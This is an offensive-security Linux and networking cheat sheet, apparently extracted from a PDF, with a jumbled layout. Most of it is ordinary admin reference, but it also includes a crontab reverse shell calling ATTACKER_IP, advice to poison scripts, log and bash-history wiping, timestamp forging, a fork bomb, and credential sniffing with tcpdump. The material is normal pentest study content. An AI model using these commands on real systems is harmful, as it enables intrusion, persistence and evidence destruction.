$2y$                                    bcrypt
$5$                                     SHA-256
$6$                                     SHA-512
Note: */etc/login.defs contains the shadow configuration.

                /ETC/PASSWD FILE FORMAT
                 1 2 3 4 5 6       7
               root: x: 0: 0: Root: /root: /bin/bash:
1        Login name
2        Password (x: password in shadow file, *: user cannot use login)
3        User ID (UID) root = 0
4        Primary Group ID (GID)
5   Comment Field/User full name
6   User’s home directory
7   User’s default shell
L              S           E
               OPERATING SYSTEM
                 INFORMATION
    df -h                          Disk usage
                            Kernel version & CPU
    uname -a
                                  information
    cat /etc/issue         Display OS information
                             Display OS version
    cat /etc/*release*
                                  information
    cat /proc/version    Display kernel information
                         Locate the executable files
    which                or location of each shell on
    <SHELL_NAME>           the system (Can search:
                          tscsh, csh, ksh, bash, etc.)
    fdisk -l              Display connected drives


MANIPULATE PACKAGES USING
      RPM (RED HAT)
                             List all installed Redhat
rpm -qa
                                     Packages
                                Install all Red Hat
                            packages with a filename
rpm -ivh *.rpm
                              ending in .rpm in the
                                 current directory
rpm -e
                           Remove Red Hat Package
<PACKAGE_NAME>


MANIPULATE PACKAGES USING
          DPKG
dpkg --get-selections       List all installed packages
dpkg –i *.deb          Install all packages with a
                       filename ending in .deb in
                           the current directory
dpkg –r
                           Remove Package
<PACKAGE_NAME>


   UPDATE SYSTEM USING APT
             GET
                        Updates repositories and
apt-get update            available packages to
                       prepare for OS/tool update
                       Installs newer versions of
                          packages if available
apt-get upgrade
                        (checks results of apt-get
                                 update)
                          Intelligently updates
                            system, updating
apt-get dist-upgrade        dependencies and
                        removing older obsolete
                           packages as needed
     SITUATIONAL AWARENESS &
       PROCESS MANIPULATION
                       Displays current user/group
id
                               information
                      List logged on users and what
w
                              they are doing
who -a                Show currently logged in users
                       Show past and current login
last -a
                       and system boot information
ps -ef                        Process listing
mount
or                         List mounted drives
findmnt
                        Force kill processes with
kill -9 <PID>
                                specific PID
killall               Kill all processes matching a
<PROCESS_NAME>                 specific name
                      Show all processes sorting by
top
                                most active
                        List configured persistent
cat /etc/fstab
                                  mounts


                  USER ACCOUNT
                 ENUMERATION &
                 CONFIGURATION
                                     Display user
     getent passwd                   and service
                                      accounts
     useradd –m <USERNAME>           Add a user
     usermod -g <GROUPNAME>          Add user to
     <USERNAME>                         group
                                     Change user
     passwd <USERNAME>
                                      password
usermod --expiredate 1 --lock --    Lock user
shell /bin/nologin <USERNAME>        account
usermod --expiredate 99999 --
                                   Unlock user
unlock --shell /bin/bash
                                    account
<USERNAME>
                                    Enumerate
chage –l <USERNAME>                user account
                                      details
userdel <USERNAME>                  Delete user
             NETWORK CONFIGURATION
                                                 List all
                                               listening,
                                              established,
                                                   and
watch --interval 3 ss -t --all
                                               connected
                                             TCP sockets
                                                 every 3
                                                 seconds
                                                 List all
                                                listening
                                                TCP and
                                             UDP sockets
netstat -tulpn
                                                   with
                                               associated
                                             PID/program
                                                  name
                                                 List all
                                                network
                                                 activity
lsof –i –u <USERNAME> -a
                                             associated to
                                               a specific
                                                   user
ifconfig <INTERFACE_NAME> <NEW_IP> netmask
<NEW_SUBNET_MASK>                            Set IP and
or                                           NETMASK
ip addr add <NEW_IP> dev <INTERFACE_NAME>
ifconfig <INTERFACE_NAME>:
<NEW_INTERFACE_NAME> <NEW_IP>                 Add second
or                                           IP to existing
ip addr add <NEW_IP>/<CIDR> dev                interface
<INTERFACE_NAME>
route add default gw <IP_ADDRESS>            Set gateway
<INTERFACE_NAME>
or
ip route add <IP_ADDRESS>/<CIDR> via
<GATEWAY_IP> dev <INTERFACE_NAME>
NETWORK CONFIGURATION
        CONT
ifconfig
<INTERFACE_NAME> mtu
<SIZE>
or                              Change MTU size
ip link set dev
<INTERFACE_NAME> mtu
<SIZE>
ifconfig
<INTERFACE_NAME> hw
ether <MAC_ADDRESS>
or
ip link set dev
<INTERFACE_NAME>
down
                                 Change MAC
                                   address
ip link set dev
<INTERFACE_NAME>
address <MAC_ADDRESS>

ip link set dev
<INTERFACE_NAME> up
iwlist                           Built-in Wi-Fi
<INTERFACE_NAME> scan               Scanner
cat /var/log/messages | grep       List DHCP
DHCP                              assignments
                                   Kills TCP
                                  connections
tcpkill host <IP_ADDRESS>
                                 running over
and port <PORT>
                                  specific port
                                    number
echo “1” >                       Enable on IP
/proc/sys/net/ipv4/ip_forward     Forwarding
  echo “nameserver      Add DNS server
  <IP_ADDRESS>” >>
  /etc/resolv.conf

       DNS ZONE TRANSFER
                               Reverse
dig –x <IP_ADDRESS>
                            domain lookup
host
                          Domain lookup
<IP_ADDRESS_OR_HOSTNAME>
dig axfr
                            DNS zone
<DOMAIN_NAME_TO_TRANSFER>
                             transfer
@<DNS_IP>
host -t axfr -l
                            DNS zone
<DOMAIN_NAME_TO_TRANSFER>
                             transfer
<DNS_IP>
L          F         M
       FILE MANIPULATION
diff <FILE_PATH_A>
                           Compare files
<FILE_PATH_B>
                           Force recursive
rm –rf <FILE_PATH>             deletion of
                                directory
                               Secure file
shred –f –u <FILE_PATH>
                                 deletion
                                 Modify
touch –r
                             timestamp to
<ORIGINAL_FILE_PATH>
                            match another
<MOD_FILE_PATH>
                                   file
touch –t <YYYYMMDDHHMM>       Modify file
<FILE>                         timestamp
                              Count lines
grep –c “<STRING>”
                               containing
<FILE_PATH>
                            specific string
                           Convert Linux
awk 'sub("$", "\r")'        formatted file
<SOURCE_FILE_PATH> >          to Windows
<OUTPUT_FILE_PATH>         compatible text
                                   file
                                 Convert
                                Windows
                            formatted file
dos2unix <FILE_PATH>
                                to Linux
                           compatible text
                                   file
find . –type f -name “*.    Search current
<FILE_EXTENSION>”                 and all
                            subdirectories
                           for all files that
                                        end with a
                                          specific
                                         extension
                                     Search all files
                                       (binary and
                                     regular files) in
grep -Ria                             current and all
“<SEARCH_PHRASE>”                     subdirectories
                                         for a case
                                        insensitive
                                           phrase
                                     Return the line
wc -l <FILE_PATH>                        count of a
                                         target file
find / -perm -4000 -exec ls -ld {}      Search for
\;                                      setuid files
                                      Determine file
file <FILE_PATH>
                                            type
chattr +i <FILE_PATH>                    Set/Unset
chattr –i <FILE_PATH>                immutable file
                                         Generate
dd if=/dev/urandom of=
                                       random file
<OUTPUT_FILE_PATH>
                                      (example 3M
bs=3145728 count=100
                                            file)
      FILE COMPRESSION & CHUNKING
Compress: tar -cf
<OUTPUT_FILE>.tar                      Pack/unpack (archive) files
<INPUT_PATH>                                       using tar
Extract: tar -xf <FILE_PATH>.tar
Compress: tar -czf
<OUTPUT_FILE>.tar.gz                  Compress and extract a .gz file
<INPUT_PATH>                                       using tar
Extract: tar -xzf <FILE_PATH>.tar.gz
Compress: tar -cjf
<OUTPUT_FILE>.tar.bz2                  Compress and extract a .bz2
<INPUT_PATH>                                    file using tar
Extract: tar -xjf <FILE_PATH>.tar.bz2
Compress: gzip <INPUT_PATH>            Compress and extract using
Extract: gzip –d <FILE_PATH>.gz                      gzip
Compress: zip –r
<OUTPUT_FILE>.zip
                                      Compress and extract using zip
<INPUT_PATH>
Extract: unzip <FILE_PATH>
upx -9 –o <OUTPUT_FILE>
                                      Pack an executable using UPX
<INPUT_PATH>
dd if=<INPUT_PATH> bs=4M | gzip -c
                                      Split file into 3k chunks using
| split -b 3K –
                                                      dd
“<OUTPUT_FILE>.chunk”
cat <FILE_PATH>.chunk* | gzip -dc |
                                      Restore chunked file using dd
dd of=<OUTPUT_PATH> bs=4M


                      FILE HASHING
                                    Generate MD5 hash of a
       md5sum <FILE_PATH>
                                              file
       echo “<STRING>” |            Generate MD5 hash of a
       md5sum                                string
                                    Generate SHA1 hash of a
       sha1sum <FILE_PATH>
                                              file
               L              P
                          RC.LOCAL
                                             Add full path to
          nano /etc/rc.local                   rc.local file.
          or                                  This full path
          echo “<FILE_PATH>” >>              will be executed
          /etc/rc.local                         on system
                                                  startup.

                     LINUX SERVICE
                                                    Create/Open new
nano
                                                    service file using
/etc/systemd/system/<SERVICE_NAME>.service
                                                          nano
[Unit]                                                 Add service
after=network.targetDescription=My Service         information to file.
description                                       <FILE_PATH> is full
                                                     path to .sh file to
                                                    execute on startup
[Service]
Type=simple                                         When done, press
Restart=always                                    CTRL+X, then press
ExecStart=<FILE_PATH>                                 ‘Y’, then press
                                                   ‘Enter’ to save and
[Install]                                           close the file with
WantedBy=multi-user.target                                 nano
                                                     Reload service
systemctl daemon-reload
                                                         manager
systemctl enable <SERVICE_NAME>.service             Enable the service
                                                     Start the service
systemctl start <SERVICE_NAME>.service
                                                       persistence

                             CRONTAB
           #Open new crontab:                         Create cron
           crontab -e                                 that runs a
                                                    Netcat reverse
           #Add the following line at the end:      shell every day
           0 0 * * * nc <ATTACKER_IP>                 at midnight
           <ATTACKER_PORT> -e /bin/sh
           #Open new crontab:
                                                     Create cron
           crontab -e
                                                      that runs a
                                                    payload every
           #Add the following line at the end:
                                                        day at
           crontab -e 0 0 * * *
                                                       midnight
           <FULLPATH>
More info at: https://crontab.guru/
          POISONING EXISTING SCRIPTS
            Enumerate all persistence methods discussed in this
           section looking for existing persistence that has been
          created via script files such as .sh, .py, etc. If those are
              modifiable, modify them to launch a malicious
                             uploaded payload.
         L             S
                 NIX SCRIPTING
                                      Ping sweep
for x in {1..254..1};do ping -c
                                  (Replace first three
1 1.1.1.$x |grep "64 b" |cut -
                                   octets of IP to set
d" " -f4 >> ips.txt; done
                                   class C address to
                                         scan)
#!/bin/bash
echo "Enter Class C Range:
i.e. 192.168.3"                     Reverse DNS
                                      Lookup
read range                         (Create new bash
for ip in {1..254..1};do             script with the
host $range.$ip |grep "name       following contents)
pointer" |cut -d" " -f5
done
                                      Fork bomb

:(){ :|: & };:                    (Creates processes
                                     until system
                                      "crashes")
                                    DNS reverse
                                        lookup
for ip in {1..254..1}; do dig –
x 1.1.1.$ip | grep $ip >>         (Replace first three
dns.txt; done;                     octets of IP to set
                                   class C address to
                                         scan)
        *NIX SCRIPTING CONT.
#!/bin/sh

# This script bans any IP in the /24 subnet for
192.168.1.0 starting at 2

# It assumes 1 is the router and does not ban
IPs .20, .21, .22

i=2
while [[ $i –le 253 ]]                               IP
do                                                banning
       if [[ $i –ne 20 && $i –ne 21 && $i –ne      script
22 ]]; then
       echo "BANNED: arp –s 192.168.1.$i"
       arp –s 192.168.1.$i 00:00:00:00:00:0a
       else
       echo "IP NOT
BANNED:192.168.1.$i*****"
       echo
"*******************************"
       fi
       i=`expr $i +1`
done
                                                  Compare
                                                   2 files
for line in $(cat <FILE_PATH>); do grep –i
                                                     for
$line <FILE_PATH>; done;
                                                   similar
                                                    lines
                L            P           E
                            MISC COMMANDS
                                                                        List out audio
arecord -L
                                                                            devices
                                                                            Record
                                                                     microphone (one
arecord -d 5 -D plughw <FILE_PATH>                                      of the devices
                                                                      listed above) for
                                                                     5 seconds to a file
                                                                          Compile C
gcc <FILE_PATH>.c –o <OUTPUT_PATH>
                                                                           program
init 6
                                                                     Reboot/Shutdown
init 0
cat /etc/*syslog*.conf | grep –v “^#”                 Display log files
cat <FILE_PATH> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" |
                                                      Strip URL links
sort -u                                                  out of a file
                                                      Scrape URL and
wget http://<URL> -O <FILE_PATH> -o /dev/null
                                                        write to a file
                                                        Start a remote
rdesktop <IP_ADDRESS>                                  desktop session
                                                        with target IP
                                                         Log all shell
                                                      activity. Session
script –a <FILE_PATH>
                                                      is written to file
                                                      after session exit
                                                         Display user
history                                              command history
                                                      and then execute
!<LINE_NUMBER>                                         specific line in
                                                            history
                                                         Background
                                                        command and
                                                       print all output
nohup <COMMAND> &
                                                     from command to
                                                         a file named
                                                            .nohup
                                                         Mount SMB
mount.cifs //<IP_ADDRESS>/<SHARE_NAME> /mnt/share –o
                                                            share to
user=<USERNAME>,pass=<PASSWORD>,domain=<DOMAIN>,rw
                                                     /mnt/share folder
export PATH="<PATH_TO_ADD>:$PATH"                        Add another
                              variable to the
                                  PATH
                               Connect to
smbclient -U <USERNAME>
                              Windows SMB
//<IP_ADDRESS>/<SHARE_NAME>
                                  Share
         MOUNT USB DEVICE
                              List out potential
sudo fdisk -l              devices to mount. Make
                            note of the device path
mkdir                         Create directory to
/media/myUSBDevice                 mount to
mount
                           Mount device to created
<DEVICE_PATH>
                                 directory
/media/myUSBDevice/
                           Run mount to show all
mount | grep               mounted devices. See if
<DEVICE_PATH>                USB device was
                            mounted successfully
umount -f
                            Unmount USB device
/media/myUSBDevice


             BASH HISTORY
             MANIPULATION
echo > /var/log/auth.log         Clear auth.log
                               Clear current user
echo > ~/.bash_history
                                 Bash history
                              Delete .bash history
rm ~/.bash_history -rf
                                      file
                             Clear current session
history -c
                                    history
                             Set history max lines
export HISTFILESIZE=0
                                      to 0
                                Set history max
export HISTSIZE=0
                                commands to 0
                                Disable history
unset HISTFILE                 logging (need to
                             logout to take effect)
kill -9 $$                   Kills current session
ln -sf /dev/null             Permanently send all
~/.bash_history      Bash history
                  commands to /dev/null
                L         T
                       SSH
                                       File contains
/etc/ssh/ssh_known_hosts               system-wide
                                       known hosts
                                       File contains
                                          previous
~/.ssh/known_hosts                       hosts user
                                        has logged
                                            into
                                         Generate
ssh-keygen -t dsa -f <OUTPUT_PATH>      SSH DSA
                                            keys
                                         Generate
ssh-keygen -t rsa -f <OUTPUT_PATH>      SSH RSA
                                            keys
scp <SOURCE_PATH>                      Upload a file
<USERNAME>@<IP_ADDRESS>:/<OUTPUT_PATH> using SSH
scp                                    Download a
<USERNAME>@<IP_ADDRESS>:/<INPUT_PATH>    file using
<OUTPUT_PATH>                               SSH
                                        Connect to
                                         target via
ssh <USERNAME>@<IP_ADDRESS> –p <PORT>   SSH over a
                                       non-standard
                                            port


                SETUP SSH KEYS
   ssh-keygen                  (Run on local machine)

                               Create SSH keys. After
                                 creation command
                                        should display where
                                        keys were saved with
                                              filename
                                          (Run on remote
                                             machine)
mkdir ~/.ssh
                                         Authorized_keys may
touch ~/.ssh/authorized_keys               already exist, if it
                                            doesn’t, run this
                                               command
  Copy the contents of id_rsa.pub to target remote machine's
                  file: ~/.ssh/authorized_keys
                                            (Run on remote
chmod 700 /root/.ssh                           machine)

chmod 600                                Set permissions on
/root/.ssh/authorized_keys              newly created folders
                                              and files
                                       (Run on local machine)

                                        Run SSH to connect to
ssh -l <FILE_PATH>
                                        target. <FILE_PATH>
<USERNAME>@<IP_ADDRESS>
                                         is path to private key
                                       created above (NOT the
                                               .pub file)
  SSH FORWARDING/TUNNELING
Edit /etc/ssh/sshd_config and set:
                                         Enable Port
AllowTcpForwarding Yes                   Forwarding
GatewayPorts Yes
Press three keys at once:
SHIFT~C
                                   Setup a tunnel from
Should drop into a prompt “ssh>”
                                  an already established
Then type the tunnel command such
                                       SSH session
as:

ssh> -R 0.0.0.0:443:127.0.0.1:443
                                    Connect to remote IP
                                       address, listen on
                                    ALL IP addresses on
ssh –R 0.0.0.0:8080:127.0.0.1:443     port 8080, traverse
root@<REMOTE_IP>                        SSH tunnel, and
                                    forward traffic to the
                                    local loopback IP on
                                              443
                                        Listen on all IP
                                       interfaces on port
                                       8080 and forward
                                           that traffic
ssh –L
                                    THROUGH the SSH
0.0.0.0:8080:192.168.1.1:3300
                                     tunnel connected to
root@<REMOTE_IP>
                                   <REMOTE_IP>, and
                                      finally forward the
                                    traffic to 192.168.1.1
                                          on port 3300
(Run against remote computer)      NMAP through SSH
#Setup socks proxy on port 1080 on tunnel using
remote host:                       Proxychains
ssh –D 1080
<USERNAME>@<REMOTE_IP>
(Run on local computer)
#Add the following line to the file
/etc/proxychains.conf:
socks 4 <IP_ADDRESS> <PORT>

(Run on local computer)
#Execute Nmap against
192.168.1.1/24 tunneling traffic
through socks proxy:
proxychains nmap –sT -Pn -n –
p80,443 192.168.1.1/24
               TCPDUMP & TCPREPLAY
                                               Capture packets (headers
tcpdump –i eth0 –XX –w
                                              and data) on eth0 in ASCII
<OUTPUT_PATH>.pcap
                                                and hex and write to file
                                              Capture all port 80 (HTTP)
tcpdump tcp port 80 and dst 2.2.2.2          traffic with destination set to
                                                         2.2.2.2
                                              Show traffic from interface
                                                    eth0 destined for
                                              192.168.1.22 that isn’t port
tcpdump –i eth0 –tttt dst 192.168.1.22 and
                                                    22 (SSH) traffic.
not dst port 22
                                               Print traffic with date/time
                                                          stamps.
                                              Show traffic from interface
tcpdump -i eth0 “icmp[0] == 8”                eth0 that is an ICMP (Ping)
                                                           reply
                                               Show the first 50 packets
                                              from interface eth0 that are
tcpdump –i eth0 –c 50 –tttt udp port 53
                                                UDP and port 53 (DNS).
                                              Print with date/time stamps.
                                                  Show traffic from all
                                             interfaces that have port 443.

                                              Don’t convert host IPs or
tcpdump -nSX port 443
                                              port number names (-nn),
                                             use absolute TCP sequence
                                              numbers, and print packet
                                                          data
                                                 Show traffic from all
tcpdump -i eth0
                                                       interfaces
                                                 Show traffic from all
                                                interfaces that has host
tcpdump host 1.1.1.1
                                               1.1.1.1 set as a source or
                                                      destination
          TCPDUMP & TCPREPLAY CONT:
                                       Show
                                   traffic from
                                         all
                                    interfaces
tcpdump src 1.1.1.1
                                      that has
                                   host 1.1.1.1
                                      set as a
                                       source
                                       Show
                                   traffic from
                                         all
                                    interfaces
tcpdump dst 1.0.0.1
                                      that has
                                   host 1.0.0.1
                                      set as a
                                   destination
                                       Show
                                   traffic from
                                         all
                                    interfaces
tcpdump net 1.2.3.0/24
                                     that falls
                                      into the
                                      class C
                                    1.2.3.0/24
                                       Show
                                   traffic from
                                         all
tcpdump src port 1025               interfaces
                                    that has a
                                   source port
                                      of 1025
tcpdump port 80 -w <OUTPUT_PATH>       Show
                                   traffic from
                                         all
                                    interfaces
                                      that has
                                                                 port 80 set
                                                                as a source
                                                                      or
                                                                destination.
                                                                Save traffic
                                                                   to a file
                                                                  Filter on
                                                                  the listed
tcpdump port http or port ftp or port smtp or port imap or port      ports
pop3 or port telnet -lA | egrep -i -B5                          looking for
'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= any data
|password=|pass:|user:|username:|password:|login:|pass |user '    matching
                                                                  the egrep
                                                                terms listed
                                                                  Replay a
tcpreplay -i eth0 <INPUT_PATH>.pcap                              pcap with
                                                                   defaults
                                                                   Replay
tcpreplay --topspeed -i eth0 <INPUT_PATH>.pcap                  pcap as fast
                                                                as possible
                                                                   Replay
tcpreplay --oneatatime --verbose -i eth0 <INPUT_PATH>.pcap pcap one at
                                                                    a time
                                                                   Replay
tcpreplay --loop=10 -i eth0 <INPUT_PATH>.pcap                     pcap file
                                                                  10 times
                                                                   Replay
                                                                  pcap file
tcpreplay --loop=0 -i eth0 <INPUT_PATH>.pcap
                                                                   forever
                                                                until killed
More info at: https://danielmiessler.com/study/tcpdump/
                             SCREEN
    Note: In the table below, any reference to “Ctrl+a” == Control-a
                          keyboard combination
screen –S <NAME>                           Start new screen with name
screen –ls                                     List running screens
screen –r <NAME>                              Attach to screen name
screen –S <NAME> -X                       Send a command to a specific
<COMMAND>                                           screen name
Keybindings are CTRL+a, let go,
and press the hotkey symbol/char
Ctrl+a ?                                      List keybindings (help)
Ctrl+a d                                               Detach
Ctrl+a D D                                      Detach and logout
Ctrl+a c                                       Create new window
Ctrl+a C-a                                 Switch to last active window
Ctrl+a <NAMEorNUMBER>                     Switch to window ID or name
Ctrl+a "                                   See windows list and change
Ctrl+a k                                       Kill current window
Ctrl+a S                                     Split display horizontally
Ctrl+a |                                      Split display vertically
Ctrl+a tab                                     Jump to next display
Ctrl+a X                                      Remove current region
Ctrl+a Q                                  Remove all regions but current
                                           Rename the current focused
Ctrl+a A
                                                      window
Ctrl+a n                                      Switch to next window
Ctrl+a p                                    Switch to previous window
                             IPTABLES
 Iptables is a robust firewall and packet filter program typically installed
     by default on Linux systems. Iptables can be configured to perform
    several actions on network packets as they arrive and leave a Linux
                                   system.
                                                       Dump iptables (with
iptables-save –c > <OUTPUT_PATH>                          counters) rules to
                                                                stdout
                                                           Restore iptables
iptables-restore < <INPUT_PATH>
                                                                 rules
                                                           List all iptables
                                                        rules (not including
iptables –L –v --line-numbers                             NAT rules) with
                                                         affected count and
                                                            line numbers
                                                             List all NAT
iptables –L -t nat --line-numbers                        iptables rules with
                                                            line numbers
                                                          Flush all iptables
iptables –F
                                                                 rules
                                                           Change default
iptables -P <INPUT/FORWARD/OUTPUT>
                                                        policy for rules that
<ACCEPT/REJECT/DROP>
                                                          don’t match rules
iptables -A INPUT -i <INTERFACE_NAME> -m                 Allow established
state --state RELATED,ESTABLISHED -j                       connections on
ACCEPT                                                         INPUT
                                                        Delete 7th inbound
                                                           rule (print line
iptables -D INPUT 7
                                                        numbers to see rule
                                                                  #’s)
                                                        Increase throughput
iptables –t raw –L –n                                       by turning off
                                                             statefulness
iptables –P INPUT DROP                                         Drop all
                                                            INCOMING
                                      packets
Note: Use ip6tables for IPv6 rules.
            IPTABLES EXAMPLES
iptables -A OUTPUT -o
<INTERFACE_NAME> -p tcp --dport
22 -m state --state NEW,ESTABLISHED
-j ACCEPT                                   Allow SSH on
                                           port 22 outbound
iptables -A INPUT -i
<INTERFACE_NAME> -p tcp --sport 22
-m state --state ESTABLISHED -j
ACCEPT
iptables -A OUTPUT -o                        Allow ICMP
<INTERFACE_NAME> -p icmp --icmp-              outbound
type echo-request -j ACCEPT
                                              Port forward
echo "1" > /proc/sys/net/ipv4/ip_forward
                                         (Listen for traffic
                                          destined to port
iptables -t nat -A PREROUTING -i
                                         3389 and redirect
<INTERFACE_NAME> -p tcp --dport
                                         that traffic to host
3389 -j DNAT --to 192.168.1.2:3389
                                           192.168.1.2 on
                                             port 3389)
iptables –A INPUT –s 1.1.1.0/24 –m state    Allow only
–-state RELATED,ESTABLISHED,NEW 1.1.1.0/24, ports
–p tcp –m multiport –-dports 80,443 –j     80,443 and log
ACCEPT                                         drops to
                                         /var/log/messages
iptables –A INPUT –i eth0 –m state –-
state RELATED,ESTABLISHED –j
ACCEPT

iptables –P INPUT DROP

iptables –A OUTPUT –o eth0 –j
ACCEPT
iptables –A INPUT –i lo –j ACCEPT

iptables –A OUTPUT –o lo –j ACCEPT

iptables –N LOGGING

iptables –A INPUT –j LOGGING

iptables –A LOGGING –m limit --limit
4/min –j LOG –-log-prefix "DROPPED"

iptables –A LOGGING –j DROP
                   SERVICE MANIPULATION
                                                            List existing
   systemctl list-unit-files --type=service                  services and
                                                              run status
                                                            Check single
   systemctl list-unit-files --type=service | grep httpd
                                                            service status
                                                           List all services

                                                            [+] Service is
   service --status-all
                                                                running
                                                            [-] Service is
                                                             not running
   service <SERVICE_NAME> start                            Start a service
   service <SERVICE_NAME> stop                             Stop a service
                                                           Check status of
   service <SERVICE_NAME> status
                                                               a service
                                                           Disable service
   systemctl disable <SERVICE_NAME>                          so it will not
                                                               auto start
                                                           Enable service
   systemctl enable <SERVICE_NAME>                          so it will auto
                                                           start on reboot




@Offensive01
                            S        OS
                    SOLARIS FILE SYSTEM
                        STRUCTURE
              /etc/vfstab         File system mount table
              /var/adm/authlog        Login attempt log
              /etc/default/*           Default settings
              /etc/system            Kernel modules &
                                           config
              /var/adm/messages   Logs system messages
                                         and errors
              /etc/auto_*           Automounter config
                                            files
              /etc/inet/ipnodes      IPv4/IPv6 host file


                     SOLARIS COMMANDS
ifconfig -a
                                           List interfaces and routes
netstat -in
ifconfig <INTERFACE_NAME> dhcp start          Start DHCP client
ifconfig <INTERFACE_NAME>
                                                    Set IP
<IP_ADDRESS> + <NETMASK>
route add default <IP_ADDERSS>                    Set gateway
                                               List users without
logins -p
                                                   passwords
                                             List all services with
svcs -a
                                                      status
prstat -a                                        List processes
svcadm enable ssh                              Start SSH service
                                              Enable telnet (-d =
inetadm –e telnet
                                                    disable)
prtconf | grep Memory                        List physical memory
                                  and hard disk size
iostat -n
shutdown –i6 g0 -y                  Restart system
                               List clients connected to
dfmounts
                                          NFS
                                 Launch management
smc
                                          GUI
snoop –d <INTERFACE_NAME> -c   Capture specific number
<NUMBER_OF_PACKETS> -o          of packets and write to
<OUTPUT_PATH>                             file
N
           C        P
               C   P

      PORT #            SERVICE
20                  FTP (Data Connection)
21                 FTP (Control Connection)
22                        SSH/SCP
23                          Telnet
25                          SMTP
49                        TACACS
53                           DNS
67-68                   DHCP/BOOTP
69                       TFTP (UDP)
80                          HTTP
88                        Kerberos
110                         POP3
111                          RPC
123                      NTP (UDP)
135                     Windows RPC
137-138                   NetBIOS
139                         SMB
143                        IMAP4
161-162                 SNMP (UDP)
179                          BGP
201                       AppleTalk
389                         LDAP
443                        HTTPS
445                         SMB
500                    ISAKMP (UDP)
      PORT #   SERVICE
514                Syslog
520                  RIP
546-547           DHCPv6
587                SMTP
902            VMWare Server
1080            Socks Proxy
1194             Open VPN
1433-1434         MS-SQL
1521               Oracle
2049                NFS
3128            Squid Proxy
3306              MySQL
3389                RDP
5060                 SIP
5222-5223       XMPP/Jabber
5432            Postgres SQL
5666               Nagios
5900                VNC
6000-6063           X11
6129             DameWare
6133             DameWare
6665-6669           IRC
9001                 Tor
9001               HSQL
9090-9091         Openfire
9100            HP JetDirect
         H       C       P              P

        PORT#                    SERVICE
20                            FTP (Data Connection)
21                           FTP (Control Connection)
22                                  SSH/SCP
23                                   Telnet

        PORT#                    SERVICE
25                                  SMTP
49                                 TACACS
53                                   DNS
67/8                             DHCP/BOOTP
69                                TFTP (UDP)




             S       P              P

        PORT#                    SERVICE
20                            FTP (Data Connection)
21                           FTP (Control Connection)
22                                  SSH/SCP
23                                   Telnet
25                                   SMTP
49                                  TACACS
53                                    DNS
67-68                             DHCP/BOOTP
69                                 TFTP (UDP)
80                                OPC UA XML
102                                   ICCP
443                                         OPC UA XML
502                                          Modbus TCP

          PORT#                             SERVICE
1089-1091                        Foundation Fieldbus HSE (UDP/TCP)
2222                                      Ethernet/IP (UDP)
4000                                    ROC Plus (UDP/TCP)
4840                                 OPC UA Discovery Server
20000                                     DNP3 (UDP/TCP)
34962-34964                            PROFINET (UDP/TCP)
34980                                     EtherCAT (UDP)
44818                                  Ethernet/IP (UDP/TCP)
47808                                     BACnet/IP (UDP)
55000-55003                                 FL-net (UDP)

More info at: https://github.com/ITI/ICS-Security-
Tools/blob/master/protocols/PORTS.md


                 TTL FINGERPRINTING
         128                                  Windows
         64                                    Linux
         255                                  Network
         255                                   Solaris
                                IP 4
              CLASSFUL IPV4 RANGES
          0.0.0.0 –
                                       Class A Range
          127.255.255.255
          128.0.0.0 –
                                       Class B Range
          191.255.255.255
          192.0.0.0 –
                                       Class C Range
          223.255.255.255
          224.0.0.0 –
                                       Class D Range
          239.255.255.255
          240.0.0.0 –
                                       Class E Range
          255.255.255.255


           RESERVED PRIVATE RANGES
10.0.0.0 – 10.255.255.255                    Class A Range
172.16.0.0 – 172.31.255.255                  Class B Range
192.168.0.0 - 192.168.255.255                Class C Range
127.0.0.0 – 127.255.255.255                 Loopback Range


                        SUBNETTING
/31              255.255.255.254              0 Useable Hosts
/30              255.255.255.252              2 Hosts
/29              255.255.255.248              6 Hosts
/28              255.255.255.240              14 Hosts
/27              255.255.255.224              30 Hosts
/26              255.255.255.192              62 Hosts
/25              255.255.255.128              126 Hosts
/24              255.255.255.0                254 Hosts
/23              255.255.254.0                510 Hosts
/22              255.255.252.0                1022 Hosts
/21   255.255.248.0   2046 Hosts
/20   255.255.240.0   4094 Hosts
/19   255.255.224.0   8190 Hosts
/18   255.255.192.0   16382 Hosts
/17   255.255.128.0   32766 Hosts
/16   255.255.0.0     65534 Hosts
/15   255.254.0.0     131070 Hosts
/14   255.252.0.0     262142 Hosts
/13   255.248.0.0     524286 Hosts
/12   255.240.0.0     1048574 Hosts
/11   255.224.0.0     2097150 Hosts
/10   255.192.0.0     4194302 Hosts
/9    255.128.0.0     8388606 Hosts
/8    255.0.0.0       16777214 Hosts
                 CALCULATING SUBNET
                       RANGE
            Given: 1.1.1.101/28

            /28 = 255.255.255.240 netmask

            256 – 240 = 16 = subnet ranges of 16, i.e.
              - 1.1.1.0
              - 1.1.1.16
              - 1.1.1.32...

            Range where given IP falls: 1.1.1.96 – 1.1.1.111

More info at: https://www.calculator.net/ip-subnet-calculator.html
                               IP 6
               BROADCAST ADDRESSES
           ff02::1                       link-local nodes
           ff01::2                      node-local routers
           ff02::2                      link-local routers
           ff05::2                       site-local routers


                INTERFACE ADDRESSES
           fe80::                        link-local
           2001::                         routable
                             IPv4 compatible IPv6 (Example:
           ::a.b.c.d
                                      ::192.168.1.2)
                               IPv4 mapped IPv6 (Example:
           ::ffff:a.b.c.d
                                  ::FFFF:129.144.52.38)
           2000::/3                   Global Unicast
           FC00::/7                   Unique Local


                            IPV6 TOOLS
                                             Remote
         rsmurf6 <INTERFACE_NAME>
                                             Network
         <REMOTE_IPV6>
                                               DoS
                                             SOCAT
         socat TCP-LISTEN:                    tunnel
         <LISTEN_PORT>,reuseaddr,fork TCP6:    IPv6
         [<IPv6_ADDRESS>]:<SEND_TO_PORT> through
                                            IPv4 tools
More info at: https://github.com/vanhauser-thc/thc-ipv6
                       N
                   CISCO COMMANDS
Most commands below show the various prompts at which the commands
 are executed. For example: #, (config)#, (config-if)#, etc. Most of these
            prompts end in # before the command is typed in.
                                            Enter privileged exec mode
> enable
                                             (Known as Enable mode.
                                            Prompt will change to '#')
                                            Enter global configuration
# configure terminal
                                                      mode
(config)# interface fa0/0                   Configure FastEthernet 0/0
(config-if)# ip addr <IP_ADDRESS>
                                                  Add IP to fa0/0
<SUBNET_MASK>
(config)#line vty 0 4                            Configure vty line
(config-line)# login
                                                Set telnet password
(config-line)# password
<PASSWORD>
#show session                                      Open sessions
#show version                                       IOS version
#dir file systems                                  Available files
#dir all-filesystems                              File information
                                            List deleted, undeleted files
#dir /all
                                                and files with errors
#show running-config                          Config loaded in mem
#show startup-config                           Config loaded at boot
#show ip interface brief                             Interfaces
